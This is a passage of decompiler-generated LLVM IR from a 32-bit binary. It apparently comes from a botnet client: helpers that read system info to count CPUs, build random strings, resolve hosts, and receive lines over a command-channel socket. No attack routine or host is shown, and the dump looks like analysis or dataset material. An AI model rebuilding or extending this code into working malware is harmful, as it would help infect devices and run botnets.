dec_label_pc_8048d6a:                             ; preds = %dec_label_pc_8048d4a, %dec_label_pc_8048d2a
  br label %dec_label_pc_8048d71

dec_label_pc_8048d71:                             ; preds = %dec_label_pc_8048d41, %dec_label_pc_8048d4a, %dec_label_pc_8048d6a
  %storemerge7 = phi i32 [ 0, %dec_label_pc_8048d6a ], [ 1, %dec_label_pc_8048d4a ], [ 1, %dec_label_pc_8048d41 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048d7c:                             ; preds = %dec_label_pc_8048d05
  %v2_8048d7f = load i8, i8* %tmp13, align 1
  %v4_8048d81 = icmp eq i8 %v2_8048d7f, 0
  br i1 %v4_8048d81, label %dec_label_pc_8048dae, label %dec_label_pc_8048d85

dec_label_pc_8048d85:                             ; preds = %dec_label_pc_8048d7c
  %v1_8048d88 = add i32 %arg2, 1
  %v1_8048d8c = add i32 %v4_8048cf0, 1
  %v5_8048d91 = inttoptr i32 %v1_8048d8c to i8*
  %v5_8048d92 = call i32 @wildString(i8* %v5_8048d91, i32 %v1_8048d88)
  %v1_8048d9a = icmp ne i32 %v5_8048d92, 0
  %. = zext i1 %v1_8048d9a to i32
  br label %dec_label_pc_8048dae

dec_label_pc_8048dae:                             ; preds = %dec_label_pc_8048d85, %dec_label_pc_8048d7c
  %storemerge4 = phi i32 [ 1, %dec_label_pc_8048d7c ], [ %., %dec_label_pc_8048d85 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048db6:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048db9 = load i8, i8* %arg1, align 1
  %v3_8048db9 = zext i8 %v2_8048db9 to i32
  %v2_8048dc4 = call i32 @__GI_toupper(i32 %v3_8048db9)
  store i32 %v2_8048dc4, i32* @ebx, align 4
  %v2_8048dd1 = load i8, i8* %tmp13, align 1
  %v3_8048dd1 = zext i8 %v2_8048dd1 to i32
  %v2_8048ddc = call i32 @__GI_toupper(i32 %v3_8048dd1)
  %v0_8048de4 = load i32, i32* @ebx, align 4
  %v12_8048de4 = icmp eq i32 %v0_8048de4, %v2_8048ddc
  %v1_8048de6 = icmp eq i1 %v12_8048de4, false
  br i1 %v1_8048de6, label %dec_label_pc_8048e11, label %dec_label_pc_8048de8

dec_label_pc_8048de8:                             ; preds = %dec_label_pc_8048db6
  %v1_8048deb = add i32 %arg2, 1
  %v1_8048def = add i32 %v4_8048cf0, 1
  %v5_8048df4 = inttoptr i32 %v1_8048def to i8*
  %v5_8048df5 = call i32 @wildString(i8* %v5_8048df4, i32 %v1_8048deb)
  %v1_8048dfd = icmp ne i32 %v5_8048df5, 0
  %.8 = zext i1 %v1_8048dfd to i32
  br label %dec_label_pc_8048e11

dec_label_pc_8048e11:                             ; preds = %dec_label_pc_8048de8, %dec_label_pc_8048db6
  %storemerge = phi i32 [ 1, %dec_label_pc_8048db6 ], [ %.8, %dec_label_pc_8048de8 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048e17:                             ; preds = %dec_label_pc_8048dae, %dec_label_pc_8048d71, %dec_label_pc_8048d16, %dec_label_pc_8048e11
  %stack_var_-24.0 = phi i32 [ %storemerge7, %dec_label_pc_8048d71 ], [ %storemerge4, %dec_label_pc_8048dae ], [ %v3_8048d19, %dec_label_pc_8048d16 ], [ %storemerge, %dec_label_pc_8048e11 ]
  %v3_8048e1a = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048e1a, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048cf3, { 2, 0, 1 }
  uselistorder i32 %v4_8048cf0, { 0, 2, 1 }
  uselistorder i8* %tmp13, { 3, 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8048e17, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048d71, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8048e2c = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048e2c, i32* %arg2, align 4
  %v10_8048e40 = icmp eq i32 %v1_8048e2c, -1
  %. = zext i1 %v10_8048e40 to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048e5a = load i32, i32* @ebp, align 4
  store i32 %v0_8048e5a, i32* %stack_var_-4, align 4
  %v4_8048e826 = ptrtoint i8* %arg1 to i32
  %v2_8048e857 = load i8, i8* %arg1, align 1
  %v3_8048e858 = zext i8 %v2_8048e857 to i32
  %v5_8048e859 = and i32 %v4_8048e826, -256
  %v6_8048e8510 = or i32 %v3_8048e858, %v5_8048e859
  %v4_8048e8711 = icmp eq i8 %v2_8048e857, 0
  %v1_8048e8912 = icmp eq i1 %v4_8048e8711, false
  br i1 %v1_8048e8912, label %dec_label_pc_8048e62, label %dec_label_pc_8048e8b

dec_label_pc_8048e62:                             ; preds = %entry, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge
  %v4_8048e8214 = phi i32 [ %v5_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %v4_8048e826, %entry ]
  %stack_var_4.013 = phi i8* [ %v22_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %arg1, %entry ]
  %v2_8048e65 = load i8, i8* %stack_var_4.013, align 1
  %v3_8048e65 = zext i8 %v2_8048e65 to i32
  %v1_8048e70 = call i32 @__GI_toupper(i32 %v3_8048e65)
  %v1_8048e7d = trunc i32 %v1_8048e70 to i8
  store i8 %v1_8048e7d, i8* %stack_var_4.013, align 1
  %v5_8048e7f = add i32 %v4_8048e8214, 1
  %v22_8048e7f = inttoptr i32 %v5_8048e7f to i8*
  %v2_8048e85 = load i8, i8* %v22_8048e7f, align 1
  %v4_8048e87 = icmp eq i8 %v2_8048e85, 0
  %v1_8048e89 = icmp eq i1 %v4_8048e87, false
  br i1 %v1_8048e89, label %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge, label %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge

dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge: ; preds = %dec_label_pc_8048e62
  br label %dec_label_pc_8048e62

dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge: ; preds = %dec_label_pc_8048e62
  %v3_8048e85 = zext i8 %v2_8048e85 to i32
  %v5_8048e85 = and i32 %v5_8048e7f, -256
  %v6_8048e85 = or i32 %v3_8048e85, %v5_8048e85
  %v2_8048e8b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048e8b

dec_label_pc_8048e8b:                             ; preds = %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge, %entry
  %v2_8048e8b = phi i32 [ %v2_8048e8b.pre, %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge ], [ %v0_8048e5a, %entry ]
  %v6_8048e85.lcssa = phi i32 [ %v6_8048e85, %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge ], [ %v6_8048e8510, %entry ]
  store i32 %v2_8048e8b, i32* @ebp, align 4
  ret i32 %v6_8048e85.lcssa

; uselistorder directives
  uselistorder i8 %v2_8048e85, { 1, 0 }
  uselistorder i8* %v22_8048e7f, { 1, 0 }
  uselistorder i32 %v5_8048e7f, { 1, 2, 0 }
  uselistorder i8* %stack_var_4.013, { 1, 0 }
  uselistorder label %dec_label_pc_8048e62, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_8048ea1 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8057a80.18, i32 0, i32 0), i32 0)
  %v2_8048fff = ptrtoint i32* %stack_var_-4112 to i32
  %tmp34 = bitcast i32* %stack_var_-4112 to i8*
  %v5_804901137 = call i32 @fdgets(i32 %v2_8048fff, i32 4096, i32 %v5_8048ea1)
  %v1_804901938 = icmp eq i32 %v5_804901137, 0
  %v1_804901b39 = icmp eq i1 %v1_804901938, false
  br i1 %v1_804901b39, label %dec_label_pc_8048eb1.lr.ph, label %dec_label_pc_8049021

dec_label_pc_8048eb1.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8048eb1

dec_label_pc_8048eb1:                             ; preds = %dec_label_pc_8048eb1.lr.ph, %dec_label_pc_8048fe3
  %v3_8048ebb = call i32 @uppercase(i8* %tmp34)
  %v5_8048ed2 = call i32 @strstr(i32 %v2_8048fff, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057a8e.19, i32 0, i32 0))
  %v12_8048ee2 = icmp eq i32 %v5_8048ed2, %v2_8048fff
  %v1_8048ee4 = icmp eq i1 %v12_8048ee2, false
  br i1 %v1_8048ee4, label %dec_label_pc_8048fe3, label %dec_label_pc_8048eea

dec_label_pc_8048eea:                             ; preds = %dec_label_pc_8048eb1
  %tmp35 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_8048efb

dec_label_pc_8048ef8:                             ; preds = %dec_label_pc_8048f0d, %dec_label_pc_8048f04, %dec_label_pc_8048efb
  %v5_8048ef8 = add i32 %v4_8048efb, 1
  %v22_8048ef8 = inttoptr i32 %v5_8048ef8 to i8*
  br label %dec_label_pc_8048efb

dec_label_pc_8048efb:                             ; preds = %dec_label_pc_8048eea, %dec_label_pc_8048ef8
  %storemerge4 = phi i8* [ %v22_8048ef8, %dec_label_pc_8048ef8 ], [ %tmp35, %dec_label_pc_8048eea ]
  %v4_8048efb = ptrtoint i8* %storemerge4 to i32
  %v2_8048efe = load i8, i8* %storemerge4, align 1
  %v7_8048f00 = icmp eq i8 %v2_8048efe, 32
  br i1 %v7_8048f00, label %dec_label_pc_8048ef8, label %dec_label_pc_8048f04

dec_label_pc_8048f04:                             ; preds = %dec_label_pc_8048efb
  %v2_8048f07 = load i8, i8* %storemerge4, align 1
  %v10_8048f09 = icmp eq i8 %v2_8048f07, 9
  br i1 %v10_8048f09, label %dec_label_pc_8048ef8, label %dec_label_pc_8048f0d

dec_label_pc_8048f0d:                             ; preds = %dec_label_pc_8048f04
  %v2_8048f10 = load i8, i8* %storemerge4, align 1
  %v10_8048f12 = icmp eq i8 %v2_8048f10, 58
  br i1 %v10_8048f12, label %dec_label_pc_8048ef8, label %dec_label_pc_8048f3d

dec_label_pc_8048f18:                             ; preds = %dec_label_pc_8048f65, %dec_label_pc_8048f3d
  %v3_8048f2f = call i32 @_strlen(i8* %storemerge4)
  %v6_8048f36 = add i32 %v4_8048efb, %v3_8048f2f
  %v1_8048f39 = add i32 %v6_8048f36, -1
  %v1_8048f3a = inttoptr i32 %v1_8048f39 to i8*
  store i8 0, i8* %v1_8048f3a, align 1
  br label %dec_label_pc_8048f3d

dec_label_pc_8048f3d:                             ; preds = %dec_label_pc_8048f0d, %dec_label_pc_8048f18
  %v3_8048f54 = call i32 @_strlen(i8* %storemerge4)
  %v6_8048f5b = add i32 %v4_8048efb, %v3_8048f54
  %v1_8048f5e = add i32 %v6_8048f5b, -1
  %v1_8048f5f = inttoptr i32 %v1_8048f5e to i8*
  %v2_8048f5f = load i8, i8* %v1_8048f5f, align 1
  %v10_8048f61 = icmp eq i8 %v2_8048f5f, 13
  br i1 %v10_8048f61, label %dec_label_pc_8048f18, label %dec_label_pc_8048f65

dec_label_pc_8048f65:                             ; preds = %dec_label_pc_8048f3d
  store i1 false, i1* @df, align 1
  store i32 %v4_8048efb, i32* @edi, align 4
  %v3_8048f7c = call i32 @_strlen(i8* %storemerge4)
  %v6_8048f83 = add i32 %v4_8048efb, %v3_8048f7c
  %v1_8048f86 = add i32 %v6_8048f83, -1
  %v1_8048f87 = inttoptr i32 %v1_8048f86 to i8*
  %v2_8048f87 = load i8, i8* %v1_8048f87, align 1
  %v10_8048f89 = icmp eq i8 %v2_8048f87, 10
  br i1 %v10_8048f89, label %dec_label_pc_8048f18, label %dec_label_pc_8048f8d

dec_label_pc_8048f8d:                             ; preds = %dec_label_pc_8048f65
  %v5_8048f96 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v1_8048f9e = icmp eq i32 %v5_8048f96, 0
  br i1 %v1_8048f9e, label %dec_label_pc_8048fb6, label %dec_label_pc_8048fa2

dec_label_pc_8048fa2:                             ; preds = %dec_label_pc_8048f8d
  %v5_8048fab = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v6_8048fab = inttoptr i32 %v5_8048fab to i8*
  store i8 0, i8* %v6_8048fab, align 1
  br label %dec_label_pc_8048fb6

dec_label_pc_8048fb6:                             ; preds = %dec_label_pc_8048f8d, %dec_label_pc_8048fa2
  store i32 %v4_8048efb, i32* @eax, align 4
  %v5_8048fc0 = inttoptr i32 %arg1 to i8*
  %v5_8048fc1 = call i32 @strcpy(i8* %v5_8048fc0, i32 %v4_8048efb)
  %v2_8048fcf = call i32 @__libc_close(i32 %v5_8048ea1)
  br label %dec_label_pc_8049039

dec_label_pc_8048fe3:                             ; preds = %dec_label_pc_8048eb1
  %v6_8048ff7 = call i32 @__GI_memset(i8* %tmp34, i32 0, i32 4096)
  %v5_8049011 = call i32 @fdgets(i32 %v2_8048fff, i32 4096, i32 %v5_8048ea1)
  %v1_8049019 = icmp eq i32 %v5_8049011, 0
  %v1_804901b = icmp eq i1 %v1_8049019, false
  br i1 %v1_804901b, label %dec_label_pc_8048eb1, label %dec_label_pc_8049021

dec_label_pc_8049021:                             ; preds = %dec_label_pc_8048fe3, %entry
  %v2_8049027 = call i32 @__libc_close(i32 %v5_8048ea1)
  br label %dec_label_pc_8049039

dec_label_pc_8049039:                             ; preds = %dec_label_pc_8048fb6, %dec_label_pc_8049021
  %storemerge = phi i32 [ 1, %dec_label_pc_8049021 ], [ 0, %dec_label_pc_8048fb6 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048efb, { 3, 4, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_8048fff, { 3, 1, 2, 0 }
  uselistorder i32 %v5_8048ea1, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8049039, { 1, 0 }
  uselistorder label %dec_label_pc_8048fb6, { 1, 0 }
  uselistorder label %dec_label_pc_8048f3d, { 1, 0 }
  uselistorder label %dec_label_pc_8048efb, { 1, 0 }
  uselistorder label %dec_label_pc_8048eb1, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4108 = alloca i32, align 4
  %v5_804905e = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8057a80.18, i32 0, i32 0), i32 0)
  %v2_80490bf = ptrtoint i32* %stack_var_-4108 to i32
  %tmp16 = bitcast i32* %stack_var_-4108 to i8*
  %v5_80490d117 = call i32 @fdgets(i32 %v2_80490bf, i32 4096, i32 %v5_804905e)
  %v1_80490d918 = icmp eq i32 %v5_80490d117, 0
  %v1_80490db19 = icmp eq i1 %v1_80490d918, false
  br i1 %v1_80490db19, label %dec_label_pc_804906b.lr.ph, label %dec_label_pc_80490dd

dec_label_pc_804906b.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804906b

dec_label_pc_804906b:                             ; preds = %dec_label_pc_804906b.lr.ph, %dec_label_pc_804906b
  %stack_var_-12.120 = phi i32 [ 0, %dec_label_pc_804906b.lr.ph ], [ %stack_var_-12.0, %dec_label_pc_804906b ]
  %v3_8049075 = call i32 @uppercase(i8* %tmp16)
  %v5_804908c = call i32 @strstr(i32 %v2_80490bf, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057a8e.19, i32 0, i32 0))
  %v12_804909c = icmp eq i32 %v5_804908c, %v2_80490bf
  %v4_80490a0 = zext i1 %v12_804909c to i32
  %stack_var_-12.0 = add i32 %stack_var_-12.120, %v4_80490a0
  %v6_80490b7 = call i32 @__GI_memset(i8* %tmp16, i32 0, i32 4096)
  %v5_80490d1 = call i32 @fdgets(i32 %v2_80490bf, i32 4096, i32 %v5_804905e)
  %v1_80490d9 = icmp eq i32 %v5_80490d1, 0
  %v1_80490db = icmp eq i1 %v1_80490d9, false
  br i1 %v1_80490db, label %dec_label_pc_804906b, label %dec_label_pc_80490dd

dec_label_pc_80490dd:                             ; preds = %dec_label_pc_804906b, %entry
  %stack_var_-12.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-12.0, %dec_label_pc_804906b ]
  %v2_80490e3 = call i32 @__libc_close(i32 %v5_804905e)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.0, { 1, 0 }
  uselistorder i32 %v2_80490bf, { 3, 1, 2, 0 }
  uselistorder i32 %v5_804905e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804906b, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80490f0 = load i32, i32* @ebp, align 4
  store i32 %v0_80490f0, i32* %stack_var_-4, align 4
  %v0_80490f4 = load i32, i32* @ebx, align 4
  store i32 %v0_80490f4, i32* %stack_var_-12, align 4
  %v5_804910d = ptrtoint i8* %arg1 to i32
  %v5_804914e22 = icmp sgt i32 %arg2, 0
  br i1 %v5_804914e22, label %dec_label_pc_8049108, label %dec_label_pc_8049150

dec_label_pc_8049108:                             ; preds = %entry, %dec_label_pc_8049108
  %storemerge23 = phi i32 [ %v4_8049145, %dec_label_pc_8049108 ], [ 0, %entry ]
  %v6_804910d = add i32 %storemerge23, %v5_804910d
  store i32 %v6_804910d, i32* @ebx, align 4
  %v1_8049110 = call i32 @rand_cmwc(i32 %storemerge23)
  store i32 %v1_8049110, i32* @ecx, align 4
  %v2_8049120 = udiv i32 %v1_8049110, 26
  %tmp = mul i32 %v2_8049120, -10
  %v2_8049138 = add i32 %v1_8049110, %tmp
  %v1_8049140 = add i32 %v2_8049138, 65
  %v11_8049140 = trunc i32 %v1_8049140 to i8
  %v2_8049143 = load i32, i32* @ebx, align 4
  %v3_8049143 = inttoptr i32 %v2_8049143 to i8*
  store i8 %v11_8049140, i8* %v3_8049143, align 1
  %v4_8049145 = add nuw nsw i32 %storemerge23, 1
  %exitcond = icmp eq i32 %v4_8049145, %arg2
  br i1 %exitcond, label %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge, label %dec_label_pc_8049108

dec_label_pc_8049148.dec_label_pc_8049150_crit_edge: ; preds = %dec_label_pc_8049108
  %v2_8049153.pre = load i32, i32* %stack_var_-12, align 4
  %v2_8049155.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049150

dec_label_pc_8049150:                             ; preds = %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge, %entry
  %v2_8049155 = phi i32 [ %v2_8049155.pre, %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge ], [ %v0_80490f0, %entry ]
  %v2_8049153 = phi i32 [ %v2_8049153.pre, %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge ], [ %v0_80490f4, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_8049148.dec_label_pc_8049150_crit_edge ], [ 0, %entry ]
  store i32 %v2_8049153, i32* @ebx, align 4
  store i32 %v2_8049155, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_8049145, { 1, 0 }
  uselistorder i32 %storemerge23, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049108, { 1, 0 }
}

define i32 @recvLine() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804915a = load i32, i32* @edi, align 4
  store i32 %v0_804915a, i32* %stack_var_-8, align 4
  %v1_8049167 = inttoptr i32 %tmp19 to i8*
  %v1_804916c = and i32 %tmp19, -256
  store i32 %v1_804916c, i32* %eax.global-to-local, align 4
  %v5_804916e = call i8* @_memset(i8* %v1_8049167, i32 %v1_804916c, i32 %tmp20)
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804918e = ptrtoint i32* %stack_var_-168 to i32
  %tmp36 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_804918e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049195 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  %v2_80491a2 = udiv i32 %tmp15, 32
  %v1_80491a8 = urem i32 %tmp15, 32
  store i32 %v1_80491a8, i32* %eax.global-to-local, align 4
  %v0_80491ab = load i32, i32* @ebp, align 4
  %v2_80491ab = mul nuw nsw i32 %v2_80491a2, 4
  %v3_80491ab = add nsw i32 %v2_80491ab, -164
  %v4_80491ab = add i32 %v3_80491ab, %v0_80491ab
  %v5_80491ab = inttoptr i32 %v4_80491ab to i32*
  %v6_80491ab = load i32, i32* %v5_80491ab, align 4
  %v9_80491ab = shl i32 1, %v1_80491a8
  %v12_80491ab = or i32 %v6_80491ab, %v9_80491ab
  store i32 %v12_80491ab, i32* %v5_80491ab, align 4
  %v1_80491b6 = add i32 %tmp15, 1
  %v2_80491ba = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_804918e, i32* %eax.global-to-local, align 4
  %v5_80491d2 = call i32 @__libc_select(i32 %v1_80491b6, i32 %v2_804918e, i32 0, i32 %v2_804918e, i32 %v2_80491ba)
  store i32 %v5_80491d2, i32* %eax.global-to-local, align 4
  %tmp37 = icmp slt i32 %v5_80491d2, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8049282, label %dec_label_pc_8049278.preheader

dec_label_pc_8049278.preheader:                   ; preds = %entry
  %v7_804927c45 = icmp sgt i32 %tmp11, 9
  br i1 %v7_804927c45, label %dec_label_pc_8049282, label %dec_label_pc_80491ec.lr.ph

dec_label_pc_80491ec.lr.ph:                       ; preds = %dec_label_pc_8049278.preheader
  br label %dec_label_pc_80491ec

dec_label_pc_80491ec:                             ; preds = %dec_label_pc_80491ec.lr.ph, %dec_label_pc_8049275
  %stack_var_-36.046 = phi i32 [ %tmp11, %dec_label_pc_80491ec.lr.ph ], [ %v4_8049275, %dec_label_pc_8049275 ]
  %v0_80491ec = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_80491ec, i32* %eax.global-to-local, align 4
  %v3_80491fa = call i32 @sockprintf(i32 %v0_80491ec, i32 ptrtoint ([5 x i8]* @global_var_8057a97.21 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804918e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049227 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  store i32 %v1_80491a8, i32* %eax.global-to-local, align 4
  %v0_804923d = load i32, i32* @ebp, align 4
  %v4_804923d = add i32 %v3_80491ab, %v0_804923d
  %v5_804923d = inttoptr i32 %v4_804923d to i32*
  %v6_804923d = load i32, i32* %v5_804923d, align 4
  %v12_804923d = or i32 %v6_804923d, %v9_80491ab
  store i32 %v12_804923d, i32* %v5_804923d, align 4
  store i32 %v2_804918e, i32* %eax.global-to-local, align 4
  %v5_8049264 = call i32 @__libc_select(i32 %v1_80491b6, i32 %v2_804918e, i32 0, i32 %v2_804918e, i32 %v2_80491ba)
  store i32 %v5_8049264, i32* %eax.global-to-local, align 4
  %tmp39 = icmp slt i32 %v5_8049264, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br i1 %tmp40, label %dec_label_pc_8049282, label %dec_label_pc_8049275

dec_label_pc_8049275:                             ; preds = %dec_label_pc_80491ec
  %v4_8049275 = add nsw i32 %stack_var_-36.046, 1
  %v7_804927c = icmp sgt i32 %stack_var_-36.046, 8
  br i1 %v7_804927c, label %dec_label_pc_8049282, label %dec_label_pc_80491ec

dec_label_pc_8049282:                             ; preds = %dec_label_pc_8049278.preheader, %dec_label_pc_80491ec, %dec_label_pc_8049275, %entry
  store i32 %tmp19, i32* %eax.global-to-local, align 4
  %v2_804929a = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_80492dc

dec_label_pc_8049291:                             ; preds = %dec_label_pc_80492dc
  %v0_8049291 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_8049291, i32* %eax.global-to-local, align 4
  %v5_80492a2 = call i32 @__libc_recv(i32 %v0_8049291, i32 %v2_804929a, i32 1, i32 0)
  store i32 %v5_80492a2, i32* %eax.global-to-local, align 4
  %v9_80492aa = icmp eq i32 %v5_80492a2, 1
  br i1 %v9_80492aa, label %dec_label_pc_80492c1, label %dec_label_pc_80492af

dec_label_pc_80492af:                             ; preds = %dec_label_pc_8049291
  %v4_80492af = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 %v4_80492af, i32* %eax.global-to-local, align 4
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_80492f9

dec_label_pc_80492c1:                             ; preds = %dec_label_pc_8049291
  %v3_80492c1 = load i8, i8* %stack_var_-177, align 1
  %v4_80492c1 = sext i8 %v3_80492c1 to i32
  store i32 %v4_80492c1, i32* %eax.global-to-local, align 4
  %v4_80492c7 = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_80492c1, i8* %stack_var_-32.0, align 1
  %v5_80492cc = add i32 %v4_80492c7, 1
  %v22_80492cc = inttoptr i32 %v5_80492cc to i8*
  %v3_80492cf = load i8, i8* %stack_var_-177, align 1
  %v4_80492cf = sext i8 %v3_80492cf to i32
  %v6_80492cf = load i32, i32* %eax.global-to-local, align 4
  %v7_80492cf = and i32 %v6_80492cf, -256
  %v8_80492cf = or i32 %v7_80492cf, %v4_80492cf
  store i32 %v8_80492cf, i32* %eax.global-to-local, align 4
  %v10_80492d5 = icmp eq i8 %v3_80492cf, 10
  br i1 %v10_80492d5, label %dec_label_pc_80492ea, label %dec_label_pc_80492d9

dec_label_pc_80492d9:                             ; preds = %dec_label_pc_80492c1
  %v4_80492d9 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_80492dc

dec_label_pc_80492dc:                             ; preds = %dec_label_pc_8049282, %dec_label_pc_80492d9
  %v7_80492e0 = phi i32 [ %tmp19, %dec_label_pc_8049282 ], [ %v8_80492cf, %dec_label_pc_80492d9 ]
  %stack_var_-32.0 = phi i8* [ %v1_8049167, %dec_label_pc_8049282 ], [ %v22_80492cc, %dec_label_pc_80492d9 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8049282 ], [ %v4_80492d9, %dec_label_pc_80492d9 ]
  %stack_var_12.0 = phi i32 [ %tmp20, %dec_label_pc_8049282 ], [ %v4_80492dc, %dec_label_pc_80492d9 ]
  %v4_80492dc = add i32 %stack_var_12.0, -1
  %v9_80492dc = sub i32 0, %stack_var_12.0
  %v10_80492dc = and i32 %stack_var_12.0, %v9_80492dc
  %v11_80492dc = icmp slt i32 %v10_80492dc, 0
  %v12_80492dc = icmp eq i32 %v4_80492dc, 0
  %v13_80492dc = icmp slt i32 %v4_80492dc, 0
  %v3_80492e0 = icmp eq i1 %v13_80492dc, %v11_80492dc
  %v4_80492e0 = icmp eq i1 %v12_80492dc, false
  %v5_80492e0 = and i1 %v4_80492e0, %v3_80492e0
  %v6_80492e0 = zext i1 %v5_80492e0 to i32
  %v8_80492e0 = and i32 %v7_80492e0, -256
  %v9_80492e0 = or i32 %v6_80492e0, %v8_80492e0
  store i32 %v9_80492e0, i32* %eax.global-to-local, align 4
  %v4_80492e6 = icmp eq i1 %v5_80492e0, false
  %v1_80492e8 = icmp eq i1 %v4_80492e6, false
  br i1 %v1_80492e8, label %dec_label_pc_8049291, label %dec_label_pc_80492ea

dec_label_pc_80492ea:                             ; preds = %dec_label_pc_80492c1, %dec_label_pc_80492dc
  %stack_var_-32.1 = phi i8* [ %v22_80492cc, %dec_label_pc_80492c1 ], [ %stack_var_-32.0, %dec_label_pc_80492dc ]
  store i8 0, i8* %stack_var_-32.1, align 1
  store i32 %stack_var_-28.0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80492f9

dec_label_pc_80492f9:                             ; preds = %dec_label_pc_80492af, %dec_label_pc_80492ea
  %storemerge = phi i32 [ -1, %dec_label_pc_80492af ], [ %stack_var_-28.0, %dec_label_pc_80492ea ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v3_80492ff = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80492ff, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80492dc, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 2, 0, 1, 3, 4 }
  uselistorder i8* %v22_80492cc, { 1, 0 }
  uselistorder i32 %v1_80491a8, { 2, 1, 0 }
  uselistorder i32 %v2_804918e, { 0, 3, 4, 5, 1, 2, 6, 7 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
